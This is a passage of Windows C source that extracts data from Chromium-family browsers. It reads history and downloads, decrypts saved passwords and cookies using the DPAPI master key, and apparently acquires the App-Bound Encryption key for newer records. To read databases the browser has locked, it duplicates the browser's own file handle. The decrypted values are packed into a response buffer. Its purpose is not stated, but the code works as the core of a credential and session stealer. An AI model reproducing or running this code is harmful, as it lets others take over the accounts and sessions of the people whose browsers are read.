            }
            if (*Found) break;
        }
        if (Process->NextEntryOffset == 0) break;
        Process = Add2Ptr(Process, Process->NextEntryOffset);
    }
    Sys_FreeInfo(Processes);
    if (NT_SUCCESS(Status) && !*Found) Status = STATUS_OBJECT_NAME_NOT_FOUND;
    return Status;
}

static
NTSTATUS
ZpBrowser_MapDatabaseHandle(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCWSTR DatabasePath,
    _Out_ PIO_FILE_MAP Map)
{
    LOGICAL Found;
    NTSTATUS Status;

    Status = ZpBrowser_MapDatabaseHandleByOwners(DatabasePath, Map, &Found);
    if (!Found)
    {
        Status = ZpBrowser_MapDatabaseHandleByScan(Browser, DatabasePath, Map, &Found);
    }
    if (!NT_SUCCESS(Status)) return Status;
    if ((ULONGLONG)Map->FileSize > (ULONGLONG)MAXLONGLONG)
    {
        IO_UnmapFile(Map);
        return STATUS_FILE_TOO_LARGE;
    }
    return STATUS_SUCCESS;
}

static
PCWSTR
ZpBrowser_ColumnText(
    _In_ sqlite3_stmt* Statement,
    _In_ ULONG Column)
{
    PCWSTR Value = sqlite3_column_text16(Statement, Column);

    return Value != NULL && sqlite3_column_bytes16(Statement, Column) != 0 ? Value : L"";
}

static
HRESULT
ZpBrowser_OpenJsonDocument(
    _In_ PCWSTR Path,
    _Outptr_ IJsonValue** Value);

static
NTSTATUS
ZpBrowser_Utf8ToString(
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ ULONG Length,
    _Outptr_result_z_ PWSTR* Text)
{
    ULONG UnicodeBytes;
    NTSTATUS Status;

    Status = RtlUTF8ToUnicodeN(NULL, 0, &UnicodeBytes, (PCCH)Value, Length);
    if (!NT_SUCCESS(Status)) return Status;
    *Text = Mem_Alloc((SIZE_T)UnicodeBytes + sizeof(WCHAR));
    if (*Text == NULL) return STATUS_NO_MEMORY;
    Status = RtlUTF8ToUnicodeN(*Text, UnicodeBytes, &UnicodeBytes, (PCCH)Value, Length);
    if (NT_SUCCESS(Status)) (*Text)[UnicodeBytes / sizeof(WCHAR)] = UNICODE_NULL;
    else
    {
        Mem_Free(*Text);
        *Text = NULL;
    }
    return Status;
}

static
HRESULT
ZpBrowser_LoadCookieKey(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCWSTR UserData,
    _Out_ PZP_BROWSER_COOKIE_KEY Key)
{
    DATA_BLOB Input, Output = { 0 };
    WCHAR Path[MAX_PATH];
    IJsonValue* Root = NULL;
    IJsonObject* RootObject = NULL;
    IJsonObject* OsCrypt = NULL;
    HSTRING_HEADER NameHeader;
    HSTRING Name;
    HSTRING EncodedString = NULL;
    PCWSTR EncodedText;
    PBYTE Encoded = NULL;
    ULONG EncodedTextLength;
    DWORD EncodedLength = 0, EncodedCapacity = 0;
    HRESULT Result;

    Key->Length = 0;
    Key->V20Length = 0;
    Key->V20Attempted = FALSE;
    Result = StringCchPrintfW(Path, ARRAYSIZE(Path), L"%s\\Local State", UserData);
    if (FAILED(Result)) return Result;
    Result = ZpBrowser_OpenJsonDocument(Path, &Root);
    if (FAILED(Result)) goto Cleanup;
    Result = Root->lpVtbl->GetObject(Root, &RootObject);
    if (FAILED(Result)) goto Cleanup;
    Result = _Inline_WindowsCreateStringReference(L"os_crypt", _STR_LEN(L"os_crypt"), &NameHeader, &Name);
    if (FAILED(Result)) goto Cleanup;
    Result = RootObject->lpVtbl->GetNamedObject(RootObject, Name, &OsCrypt);
    if (FAILED(Result)) goto Cleanup;
    Result = _Inline_WindowsCreateStringReference(L"encrypted_key", _STR_LEN(L"encrypted_key"),
                                                 &NameHeader, &Name);
    if (FAILED(Result)) goto Cleanup;
    Result = OsCrypt->lpVtbl->GetNamedString(OsCrypt, Name, &EncodedString);
    if (FAILED(Result)) goto Cleanup;
    EncodedText = _Inline_WindowsGetStringRawBuffer(EncodedString, &EncodedTextLength);
    if (!CryptStringToBinaryW(EncodedText,
                              EncodedTextLength,
                              CRYPT_STRING_BASE64,
                              NULL,
                              &EncodedLength,
                              NULL,
                              NULL))
    {
        Result = HRESULT_FROM_WIN32(GetLastError());
        goto Cleanup;
    }
    EncodedCapacity = EncodedLength;
    Encoded = Mem_Alloc(EncodedLength);
    if (Encoded == NULL)
    {
        Result = E_OUTOFMEMORY;
        goto Cleanup;
    }
    if (!CryptStringToBinaryW(EncodedText,
                              EncodedTextLength,
                              CRYPT_STRING_BASE64,
                              Encoded,
                              &EncodedLength,
                              NULL,
                              NULL))
    {
        Result = HRESULT_FROM_WIN32(GetLastError());
    }
    else if (EncodedLength <= 5 || !RtlEqualMemory(Encoded, "DPAPI", 5))
    {
        Result = E_NOTIMPL;
    }
    else
    {
        Input.pbData = Encoded + 5;
        Input.cbData = EncodedLength - 5;
        if (!CryptUnprotectData(&Input, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &Output))
        {
            Result = HRESULT_FROM_WIN32(GetLastError());
        }
        else if (Output.cbData != sizeof(Key->Data))
        {
            Result = HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
        }
        else
        {
            RtlCopyMemory(Key->Data, Output.pbData, Output.cbData);
            Key->Length = Output.cbData;
            Result = S_OK;
        }
    }
Cleanup:
    if (Output.pbData != NULL)
    {
        RtlSecureZeroMemory(Output.pbData, Output.cbData);
        LocalFree(Output.pbData);
    }
    if (Encoded != NULL)
    {
        RtlSecureZeroMemory(Encoded, EncodedCapacity);
        Mem_Free(Encoded);
    }
    _Inline_WindowsDeleteString(EncodedString);
    if (RootObject != NULL) RootObject->lpVtbl->Release(RootObject);
    if (OsCrypt != NULL) OsCrypt->lpVtbl->Release(OsCrypt);
    if (Root != NULL) Root->lpVtbl->Release(Root);
    return Result;
}

/* lazily fetch the App-Bound Encryption key on the first v20 record:
 * plain v10 (DPAPI) data must not pay for the ABE acquisition path */
static
VOID
ZpBrowser_LoadV20CookieKey(
    _In_ ZP_BROWSER_TYPE Browser,
    _Inout_ PZP_BROWSER_COOKIE_KEY Key,
    _In_reads_bytes_(Length) const BYTE* Encrypted,
    _In_ ULONG Length)
{
    if (Length < 3 || !RtlEqualMemory(Encrypted, "v20", 3) || Key->V20Attempted) return;
    Key->V20Attempted = TRUE;
    if (NT_SUCCESS(ZpAbeAcquireCookieKey(Browser == ZpBrowserChrome ? ZP_ABE_CHROME : ZP_ABE_EDGE,
                                         Key->V20Data,
                                         NULL)))
    {
        Key->V20Length = sizeof(Key->V20Data);
    }
}

static
NTSTATUS
ZpBrowser_CookieBytesToString(
    _In_ PCWSTR Host,
    _In_ ULONG SchemaVersion,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ ULONG Length,
    _Outptr_result_z_ PWSTR* Text)
{
    BCRYPT_ALG_HANDLE Algorithm = NULL;
    BYTE Utf8Host[1024], Digest[32];
    ULONG Utf8Length;
    NTSTATUS Status;

    if (SchemaVersion < 24) return ZpBrowser_Utf8ToString(Value, Length, Text);
    if (Length < sizeof(Digest)) return STATUS_DATA_ERROR;
    Status = RtlUnicodeToUTF8N(NULL,
                              0,
                              &Utf8Length,
                              Host,
                              (ULONG)(wcslen(Host) * sizeof(WCHAR)));
    if (!NT_SUCCESS(Status)) return Status;
    if (Utf8Length > sizeof(Utf8Host)) return STATUS_NAME_TOO_LONG;
    Status = RtlUnicodeToUTF8N((PCHAR)Utf8Host,
                              sizeof(Utf8Host),
                              &Utf8Length,
                              Host,
                              (ULONG)(wcslen(Host) * sizeof(WCHAR)));
    if (NT_SUCCESS(Status))
        Status = BCryptOpenAlgorithmProvider(&Algorithm, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (NT_SUCCESS(Status))
        Status = BCryptHash(Algorithm,
                            NULL,
                            0,
                            Utf8Host,
                            Utf8Length,
                            Digest,
                            sizeof(Digest));
    if (NT_SUCCESS(Status) && !RtlEqualMemory(Digest, Value, sizeof(Digest))) Status = STATUS_DATA_ERROR;
    if (Algorithm != NULL) BCryptCloseAlgorithmProvider(Algorithm, 0);
    RtlSecureZeroMemory(Utf8Host, sizeof(Utf8Host));
    RtlSecureZeroMemory(Digest, sizeof(Digest));
    return NT_SUCCESS(Status) ?
               ZpBrowser_Utf8ToString(Value + sizeof(Digest), Length - sizeof(Digest), Text) : Status;
}

static
NTSTATUS
ZpBrowser_DecryptAesCookie(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ ULONG Length,
    _In_ PCWSTR Host,
    _In_ ULONG SchemaVersion,
    _Outptr_result_z_ PWSTR* Text)
{
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Authentication;
    BCRYPT_ALG_HANDLE Algorithm = NULL;
    BCRYPT_KEY_HANDLE Cipher = NULL;
    PBYTE KeyObject = NULL, Plaintext = NULL;
    ULONG KeyObjectLength, ResultLength, PlaintextLength = Length - 3 - 12 - 16;
    NTSTATUS Status;

    Status = BCryptOpenAlgorithmProvider(&Algorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (NT_SUCCESS(Status))
        Status = BCryptSetProperty(Algorithm,
                                   BCRYPT_CHAINING_MODE,
                                   (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                   sizeof(BCRYPT_CHAIN_MODE_GCM),
                                   0);
    if (NT_SUCCESS(Status))
        Status = BCryptGetProperty(Algorithm,
                                   BCRYPT_OBJECT_LENGTH,
                                   (PUCHAR)&KeyObjectLength,
                                   sizeof(KeyObjectLength),
                                   &ResultLength,
                                   0);
    KeyObject = NT_SUCCESS(Status) ? Mem_Alloc(KeyObjectLength) : NULL;
    Plaintext = NT_SUCCESS(Status) ? Mem_Alloc(max(PlaintextLength, 1)) : NULL;
    if (NT_SUCCESS(Status) && (KeyObject == NULL || Plaintext == NULL)) Status = STATUS_NO_MEMORY;
    if (NT_SUCCESS(Status))
        Status = BCryptGenerateSymmetricKey(Algorithm,
                                            &Cipher,
                                            KeyObject,
                                            KeyObjectLength,
                                            (PUCHAR)Key,
                                            32,
                                            0);
    BCRYPT_INIT_AUTH_MODE_INFO(Authentication);
    Authentication.pbNonce = (PUCHAR)Value + 3;
    Authentication.cbNonce = 12;
    Authentication.pbTag = (PUCHAR)Value + Length - 16;
    Authentication.cbTag = 16;
    if (NT_SUCCESS(Status))
        Status = BCryptDecrypt(Cipher,
                               (PUCHAR)Value + 15,
                               PlaintextLength,
                               &Authentication,
                               NULL,
                               0,
                               Plaintext,
                               PlaintextLength,
                               &ResultLength,
                               0);
    if (NT_SUCCESS(Status))
        Status = ZpBrowser_CookieBytesToString(Host, SchemaVersion, Plaintext, ResultLength, Text);
    if (Cipher != NULL) BCryptDestroyKey(Cipher);
    if (Algorithm != NULL) BCryptCloseAlgorithmProvider(Algorithm, 0);
    if (Plaintext != NULL) RtlSecureZeroMemory(Plaintext, PlaintextLength);
    if (KeyObject != NULL) RtlSecureZeroMemory(KeyObject, KeyObjectLength);
    Mem_Free(Plaintext);
    Mem_Free(KeyObject);
    return Status;
}

static
NTSTATUS
ZpBrowser_DecryptCookie(
    _In_ PCZP_BROWSER_COOKIE_KEY Key,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ ULONG Length,
    _In_ PCWSTR Host,
    _In_ ULONG SchemaVersion,
    _Outptr_result_z_ PWSTR* Text)
{
    DATA_BLOB Input, Output = { 0 };
    NTSTATUS Status;

    if (Length >= 3 &&
        (RtlEqualMemory(Value, "v10", 3) || RtlEqualMemory(Value, "v11", 3)))
    {
        return Length >= 31 && Key->Length != 0 ?
                   ZpBrowser_DecryptAesCookie(Key->Data, Value, Length, Host, SchemaVersion, Text) :
                   STATUS_NOT_SUPPORTED;
    }
    if (Length >= 3 && RtlEqualMemory(Value, "v20", 3))
    {
        return Length >= 31 && Key->V20Length != 0 ?
                   ZpBrowser_DecryptAesCookie(Key->V20Data, Value, Length, Host, SchemaVersion, Text) :
                   STATUS_NOT_SUPPORTED;
    }
    Input.pbData = (PBYTE)Value;
    Input.cbData = Length;
    if (!CryptUnprotectData(&Input, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &Output))
    {
        return NTSTATUS_FROM_WIN32(GetLastError());
    }
    Status = ZpBrowser_CookieBytesToString(Host,
                                           SchemaVersion,
                                           Output.pbData,
                                           Output.cbData,
                                           Text);
    RtlSecureZeroMemory(Output.pbData, Output.cbData);
    LocalFree(Output.pbData);
    return Status;
}

static
ULONGLONG
ZpBrowser_ChromiumTime(
    _In_ sqlite3_int64 Value)
{
    return Value > 0 && (ULONGLONG)Value <= MAXULONGLONG / 10 ? (ULONGLONG)Value * 10 : 0;
}

static
NTSTATUS
ZpBrowser_AddSqliteRecord(
    _Inout_ PZP_BROWSER_BUILDER Builder,
    _In_ sqlite3_stmt* Statement,
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ ZP_BROWSER_KIND Kind,
    _Inout_ PZP_BROWSER_COOKIE_KEY CookieKey)
{
    PWSTR Decrypted = NULL;
    const BYTE* Encrypted;
    ULONG EncryptedLength;
    ULONG SchemaVersion;
    ULONGLONG Id = (ULONGLONG)sqlite3_column_int64(Statement, 0);
    ZP_BROWSER_RECORD_DATA Data;
    PCWSTR Identity, Name, Location, Detail;
    NTSTATUS Status;

    if (Kind == ZpBrowserKindHistory)
    {
        Identity = ZpBrowser_ColumnText(Statement, 1);
        Name = ZpBrowser_ColumnText(Statement, 2);
        Location = NULL;
        Detail = NULL;
        Data.History.LastVisitTime = ZpBrowser_ChromiumTime(sqlite3_column_int64(Statement, 3));
        Data.History.VisitCount = (ULONG)sqlite3_column_int(Statement, 4);
        Data.History.TypedCount = (ULONG)sqlite3_column_int(Statement, 5);
    }
    else if (Kind == ZpBrowserKindDownload)
    {
        Identity = ZpBrowser_ColumnText(Statement, 1);
        Name = ZpBrowser_ColumnText(Statement, 2);
        Location = NULL;
        Detail = NULL;
        Data.Download.StartTime = ZpBrowser_ChromiumTime(sqlite3_column_int64(Statement, 3));
        Data.Download.EndTime = ZpBrowser_ChromiumTime(sqlite3_column_int64(Statement, 4));
        Data.Download.ReceivedBytes = (ULONGLONG)sqlite3_column_int64(Statement, 5);
        Data.Download.TotalBytes = (ULONGLONG)sqlite3_column_int64(Statement, 6);
        Data.Download.State = (ULONG)sqlite3_column_int(Statement, 7);
        Data.Download.InterruptReason = (ULONG)sqlite3_column_int(Statement, 8);
    }
    else if (Kind == ZpBrowserKindPassword)
    {
        Identity = ZpBrowser_ColumnText(Statement, 1);
        Name = ZpBrowser_ColumnText(Statement, 2);
        Location = NULL;
        Detail = L"";
        Data.Password.CreationTime = ZpBrowser_ChromiumTime(sqlite3_column_int64(Statement, 4));
        Data.Password.Flags = 0;
        Encrypted = sqlite3_column_blob(Statement, 3);
        EncryptedLength = (ULONG)sqlite3_column_bytes(Statement, 3);
        ZpBrowser_LoadV20CookieKey(Browser, CookieKey, Encrypted, EncryptedLength);
        if (Encrypted != NULL && EncryptedLength != 0)
        {
            /* passwords carry no domain-hash prefix: SchemaVersion 0 keeps the
               plaintext untouched by ZpBrowser_CookieBytesToString */
            if (NT_SUCCESS(ZpBrowser_DecryptCookie(CookieKey,
                                                   Encrypted,
                                                   EncryptedLength,
                                                   Identity,
                                                   0,
                                                   &Decrypted)))
            {
                Detail = Decrypted;
            }
            else
            {
                Data.Password.Flags |= ZP_BROWSER_FLAG_ENCRYPTED;
                if (EncryptedLength >= 3 && RtlEqualMemory(Encrypted, "v20", 3))
                    Data.Password.Flags |= ZP_BROWSER_FLAG_APP_BOUND;
            }
        }
    }
    else
    {
        Identity = ZpBrowser_ColumnText(Statement, 1);
        Name = ZpBrowser_ColumnText(Statement, 2);
        Location = ZpBrowser_ColumnText(Statement, 3);
        Detail = ZpBrowser_ColumnText(Statement, 10);
        Data.Cookie.CreationTime = ZpBrowser_ChromiumTime(sqlite3_column_int64(Statement, 4));
        Data.Cookie.ExpirationTime = ZpBrowser_ChromiumTime(sqlite3_column_int64(Statement, 5));
        Data.Cookie.LastAccessTime = ZpBrowser_ChromiumTime(sqlite3_column_int64(Statement, 6));
        Data.Cookie.SameSite = (ULONG)sqlite3_column_int(Statement, 9);
        Data.Cookie.Flags = (sqlite3_column_int(Statement, 7) ? ZP_BROWSER_FLAG_SECURE : 0UL) |
                            (sqlite3_column_int(Statement, 8) ? ZP_BROWSER_FLAG_HTTP_ONLY : 0UL);
        Encrypted = sqlite3_column_blob(Statement, 11);
        EncryptedLength = (ULONG)sqlite3_column_bytes(Statement, 11);
        SchemaVersion = (ULONG)sqlite3_column_int(Statement, 12);
        ZpBrowser_LoadV20CookieKey(Browser, CookieKey, Encrypted, EncryptedLength);
        if (*Detail == UNICODE_NULL && Encrypted != NULL && EncryptedLength != 0)
        {
            if (NT_SUCCESS(ZpBrowser_DecryptCookie(CookieKey,
                                                   Encrypted,
                                                   EncryptedLength,
                                                   Identity,
                                                   SchemaVersion,
                                                   &Decrypted)))
            {
                Detail = Decrypted;
            }
            else
            {
                Data.Cookie.Flags |= ZP_BROWSER_FLAG_ENCRYPTED;
                if (EncryptedLength >= 3 && RtlEqualMemory(Encrypted, "v20", 3))
                    Data.Cookie.Flags |= ZP_BROWSER_FLAG_APP_BOUND;
            }
        }
    }
    Status = ZpBrowser_AddRecord(Builder,
                                 Kind,
                                 Browser,
                                 Id,
                                 &Data,
                                 Identity,
                                 Name,
                                 Location,
                                 Detail);
    if (Decrypted != NULL)
    {
        RtlSecureZeroMemory(Decrypted, wcslen(Decrypted) * sizeof(WCHAR));
        Mem_Free(Decrypted);
    }
    return Status;
}

typedef struct _ZP_BROWSER_DATABASE
{
    sqlite3* Database;
    sqlite3_stmt* Statement;
    IO_FILE_MAP Map;
    LOGICAL Mapped;
} ZP_BROWSER_DATABASE, *PZP_BROWSER_DATABASE;

static
VOID
ZpBrowser_CloseDatabase(
    _Inout_ PZP_BROWSER_DATABASE Database)
{
    if (Database->Statement != NULL)
    {
        sqlite3_finalize(Database->Statement);
        Database->Statement = NULL;
    }
    if (Database->Database != NULL)
    {
        sqlite3_close(Database->Database);
        Database->Database = NULL;
    }
    if (Database->Mapped)
    {
        IO_UnmapFile(&Database->Map);
        Database->Mapped = FALSE;
    }
}

/* opens a database read-only and validates it by preparing Sql: nolock=1,
   then immutable=1, then the locking process' handle duplicated into a
   private in-memory copy. SQLite opens lazily, so lock conflicts only surface
   at prepare time - every tier must prepare, not just open */
static
int
ZpBrowser_OpenDatabase(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_z_ PCSTR Sql,
    _In_ PCWSTR DatabasePath,
    _Out_ PZP_BROWSER_DATABASE Database)
{
    ZP_SQLITE_DESERIALIZE Deserialize;
    PSTR Uri;
    int Result;

    Database->Database = NULL;
    Database->Statement = NULL;
    Database->Mapped = FALSE;

    Uri = ZpBrowser_PathToUri(DatabasePath, "?mode=ro&nolock=1");
    if (Uri == NULL) return SQLITE_NOMEM;
    Result = sqlite3_open_v2(Uri,
                             &Database->Database,
                             SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_URI,
                             NULL);
    if (Result == SQLITE_OK)
    {
        /* plain shared-lock reads: wait out transient writer locks instead of
           failing or bypassing locking entirely */
        sqlite3_busy_timeout(Database->Database, 3000);
        Result = sqlite3_prepare_v2(Database->Database, Sql, -1, &Database->Statement, NULL);
    }
    Mem_Free(Uri);
    if (Result == SQLITE_OK) return SQLITE_OK;
    ZpBrowser_CloseDatabase(Database);

    Uri = ZpBrowser_PathToUri(DatabasePath, "?immutable=1");
    if (Uri == NULL) return SQLITE_NOMEM;
    Result = sqlite3_open_v2(Uri,
                             &Database->Database,
                             SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_URI,
                             NULL);
    if (Result == SQLITE_OK)
    {
        Result = sqlite3_prepare_v2(Database->Database, Sql, -1, &Database->Statement, NULL);
    }
    Mem_Free(Uri);
    if (Result == SQLITE_OK) return SQLITE_OK;
    ZpBrowser_CloseDatabase(Database);

    Deserialize = ZpBrowser_ResolveSqliteDeserialize();
    if (Deserialize == NULL) return Result;
    if (!NT_SUCCESS(ZpBrowser_MapDatabaseHandle(Browser, DatabasePath, &Database->Map))) return Result;
    Database->Mapped = TRUE;
    Result = sqlite3_open_v2(":memory:",
                             &Database->Database,
                             SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE | SQLITE_OPEN_NOMUTEX,
                             NULL);
    if (Result == SQLITE_OK)
    {
        Result = Deserialize(Database->Database,
                             "main",
                             Database->Map.BaseAddress,
                             (sqlite3_int64)Database->Map.FileSize,
                             (sqlite3_int64)Database->Map.FileSize,
                             SQLITE_DESERIALIZE_READONLY);
        if (Result == SQLITE_OK)
        {
            Result = sqlite3_prepare_v2(Database->Database, Sql, -1, &Database->Statement, NULL);
        }
    }
    if (Result != SQLITE_OK) ZpBrowser_CloseDatabase(Database);
    return Result;
}

/* TRUE when the merged-store row already exists in the primary store: same
   site and username, identical decrypted password */
static
LOGICAL
ZpBrowser_IsDuplicateLogin(
    _In_ sqlite3_stmt* LookupStatement,
    _In_ sqlite3_stmt* Statement,
    _In_ PCZP_BROWSER_COOKIE_KEY CookieKey)
{
    PWSTR PrimaryText = NULL, CurrentText = NULL;
    const void* Username;
    const BYTE* Password;
    const char* Origin;
    int OriginLength, UsernameLength, PasswordLength;
    LOGICAL Duplicate = FALSE;
    int Result;

    Origin = (const char*)sqlite3_column_text(Statement, 1);
    OriginLength = sqlite3_column_bytes(Statement, 1);
    Username = (const void*)sqlite3_column_text(Statement, 2);
    UsernameLength = sqlite3_column_bytes(Statement, 2);
    Result = sqlite3_bind_text(LookupStatement, 1, Origin, OriginLength, SQLITE_STATIC);
    if (Result == SQLITE_OK)
    {
        Result = sqlite3_bind_text(LookupStatement, 2, Username, UsernameLength, SQLITE_STATIC);
    }
    if (Result == SQLITE_OK && sqlite3_step(LookupStatement) == SQLITE_ROW)
    {
        Password = (const BYTE*)sqlite3_column_blob(LookupStatement, 0);
        PasswordLength = sqlite3_column_bytes(LookupStatement, 0);
        if (NT_SUCCESS(ZpBrowser_DecryptCookie(CookieKey,
                                               Password,
                                               PasswordLength,
                                               NULL,
                                               0,
                                               &PrimaryText)))
        {
            Password = (const BYTE*)sqlite3_column_blob(Statement, 3);
            PasswordLength = sqlite3_column_bytes(Statement, 3);
            if (NT_SUCCESS(ZpBrowser_DecryptCookie(CookieKey,
                                                   Password,
                                                   PasswordLength,
                                                   NULL,
                                                   0,
                                                   &CurrentText)) &&
                Str_EqualW(PrimaryText, CurrentText))
            {
                Duplicate = TRUE;
            }
        }
    }
    sqlite3_reset(LookupStatement);
    if (PrimaryText != NULL)
    {
        RtlSecureZeroMemory(PrimaryText, wcslen(PrimaryText) * sizeof(WCHAR));
        Mem_Free(PrimaryText);
    }
    if (CurrentText != NULL)
    {
        RtlSecureZeroMemory(CurrentText, wcslen(CurrentText) * sizeof(WCHAR));
        Mem_Free(CurrentText);
    }
    return Duplicate;
}

static
ZP_STATUS
ZpBrowser_QueryDatabase(
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _In_ PCWSTR UserData,
    _In_ PCWSTR DatabasePath,
    _In_opt_ PCWSTR MergedDatabasePath,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    static const char HistorySql[] =
        "SELECT id,url,title,last_visit_time,visit_count,typed_count FROM urls "
        "WHERE (?1=0 OR id<?1) ORDER BY id DESC LIMIT ?2";
    static const char DownloadSql[] =
        "SELECT d.id,COALESCE((SELECT url FROM downloads_url_chains u WHERE u.id=d.id ORDER BY chain_index "
        "LIMIT 1),''),d.target_path,d.start_time,d.end_time,d.received_bytes,d.total_bytes,d.state,"
        "d.interrupt_reason FROM downloads d WHERE (?1=0 OR d.id<?1) ORDER BY d.id DESC LIMIT ?2";
    static const char CookieSql[] =
        "SELECT rowid,host_key,name,path,creation_utc,expires_utc,last_access_utc,is_secure,is_httponly,samesite,"
        "value,encrypted_value,(SELECT value FROM meta WHERE key='version') "
        "FROM cookies WHERE (?1=0 OR rowid<?1) ORDER BY rowid DESC LIMIT ?2";
    static const char PasswordSql[] =
        "SELECT rowid,origin_url,username_value,password_value,date_created "
        "FROM logins WHERE (?1=0 OR rowid<?1) ORDER BY rowid DESC LIMIT ?2";
    static const char LoginLookupSql[] =
        "SELECT password_value FROM logins WHERE origin_url=?1 AND username_value=?2 LIMIT 1";
    ZP_BROWSER_BUILDER Builder = { 0 };
    ZP_BROWSER_COOKIE_KEY CookieKey = { 0 };
    ZP_BROWSER_DATABASE Primary = { 0 }, Merged = { 0 };
    sqlite3_stmt* LookupStatement = NULL;
    ULONGLONG NextCursor = 0, Cursor = Query->Cursor, CurrentRowId = 0;
    ULONG Source = 0, SourceCount = MergedDatabasePath != NULL ? 2 : 1, StartSource;
    PCSTR Sql = Query->Kind == ZpBrowserKindHistory ? HistorySql :
                  Query->Kind == ZpBrowserKindDownload ? DownloadSql :
                  Query->Kind == ZpBrowserKindPassword ? PasswordSql : CookieSql;
    NTSTATUS Status = STATUS_SUCCESS;
    int Result = SQLITE_OK;

    /* bit 63 of the cursor selects the merged store; the low bits are its rowid */
    StartSource = MergedDatabasePath != NULL && (Cursor >> 63) != 0 ? 1 : 0;
    if (StartSource != 0)
    {
        Cursor &= 0x7FFFFFFFFFFFFFFFULL;
        /* the dedupe lookup still needs the primary store behind it */
        Result = ZpBrowser_OpenDatabase(Query->Browser, Sql, DatabasePath, &Primary);
        if (Result == SQLITE_OK)
        {
            if (sqlite3_prepare_v2(Primary.Database, LoginLookupSql, -1, &LookupStatement, NULL) != SQLITE_OK)
            {
                LookupStatement = NULL;   /* degrade: report duplicates rather than fail */
            }
        } else
        {
            Result = SQLITE_OK;   /* primary gone: report the merged store as-is */
        }
    }
    if (Query->Kind == ZpBrowserKindCookie || Query->Kind == ZpBrowserKindPassword)
    {
        ZpBrowser_LoadCookieKey(Query->Browser, UserData, &CookieKey);
    }

    while (Source < SourceCount && Result == SQLITE_OK && Builder.Count < Query->Limit)
    {
        PCWSTR Path = Source == 0 ? DatabasePath : MergedDatabasePath;
        PZP_BROWSER_DATABASE Database = Source == 0 ? &Primary : &Merged;
        ULONGLONG SourceCursor = Source == StartSource ? Cursor : 0;
        ULONGLONG LastRowId = SourceCursor;
        ULONG Batch, Rows;

        /* the merged store is optional: a missing file just ends the stream */
        if (Source != 0 && !ZpBrowser_FileExists(Path))
        {
            Source++;
            continue;
        }
        Result = ZpBrowser_OpenDatabase(Query->Browser, Sql, Path, Database);
        if (Result != SQLITE_OK)
        {
            if (Source != 0) Result = SQLITE_OK;   /* optional: skip it */
            break;
        }
        if (Source != 0 && Primary.Database != NULL && LookupStatement == NULL)
        {
            if (sqlite3_prepare_v2(Primary.Database, LoginLookupSql, -1, &LookupStatement, NULL) != SQLITE_OK)
            {
                LookupStatement = NULL;   /* degrade: report duplicates rather than fail */
            }
        }
        for (;;)
        {
            Batch = Query->Limit - Builder.Count;
            Result = sqlite3_reset(Database->Statement);
            if (Result == SQLITE_OK)
            {
                Result = sqlite3_bind_int64(Database->Statement, 1, (sqlite3_int64)SourceCursor);
            }
            if (Result == SQLITE_OK)
            {
                Result = sqlite3_bind_int(Database->Statement, 2, (int)Batch);
            }
            if (Result != SQLITE_OK) break;
            Rows = 0;
            while ((Result = sqlite3_step(Database->Statement)) == SQLITE_ROW)
            {
                Rows++;
                LastRowId = (ULONGLONG)sqlite3_column_int64(Database->Statement, 0);
                if (Source != 0 && LookupStatement != NULL &&
                    ZpBrowser_IsDuplicateLogin(LookupStatement, Database->Statement, &CookieKey))
                {
                    continue;
                }
                Status = ZpBrowser_AddSqliteRecord(&Builder,
                                                   Database->Statement,
                                                   Query->Browser,
                                                   Query->Kind,
                                                   &CookieKey);
                if (!NT_SUCCESS(Status)) break;
            }
            if (!NT_SUCCESS(Status) || Result != SQLITE_DONE) break;
            /* the whole batch was consumed by skipped duplicates: page on */
            if (Builder.Count < Query->Limit && Rows == Batch)
            {
                SourceCursor = LastRowId;
                continue;
            }
            break;
        }
        CurrentRowId = LastRowId;
        if (Result == SQLITE_DONE) Result = SQLITE_OK;
        if (!NT_SUCCESS(Status) || Result != SQLITE_OK) break;
        Source++;
    }
    if (LookupStatement != NULL) sqlite3_finalize(LookupStatement);
    ZpBrowser_CloseDatabase(&Merged);
    ZpBrowser_CloseDatabase(&Primary);
    RtlSecureZeroMemory(&CookieKey, sizeof(CookieKey));
    if (!NT_SUCCESS(Status)) Result = SQLITE_OK;
    if (NT_SUCCESS(Status) && Result == SQLITE_OK)
    {
        if (Builder.Count < Query->Limit)
        {
            NextCursor = 0;   /* every source exhausted within this page */
        } else
        {
            NextCursor = ((ULONGLONG)Source << 63) | (CurrentRowId & 0x7FFFFFFFFFFFFFFFULL);
        }
        Status = ZpBrowser_EncodeBuilder(&Builder, NextCursor, Response, ResponseLength);
    }
    ZpBrowser_FreeBuilder(&Builder);
    return !NT_SUCCESS(Status) ? ZpStatus_FromNtStatus(Status) : ZpStatus_FromCode(ZpStatusSqlite, Result);
}

static
HRESULT
ZpBrowser_OpenJsonDocument(
    _In_ PCWSTR Path,
    _Outptr_ IJsonValue** Value)
{
    return Data_JsonParseUtf8File(Path, ZP_BROWSER_DOCUMENT_MAX_SIZE, Value);
}

static
LOGICAL
ZpBrowser_IsDocumentMissing(
    _In_ HRESULT Result)
{
    return Result == HRESULT_FROM_NT(STATUS_NO_SUCH_FILE) ||
           Result == HRESULT_FROM_NT(STATUS_OBJECT_NAME_NOT_FOUND) ||
           Result == HRESULT_FROM_NT(STATUS_OBJECT_PATH_NOT_FOUND);
}

typedef struct _ZP_BROWSER_JSON_NODE
{
    IJsonValue* Value;
    ULONG ParentId;
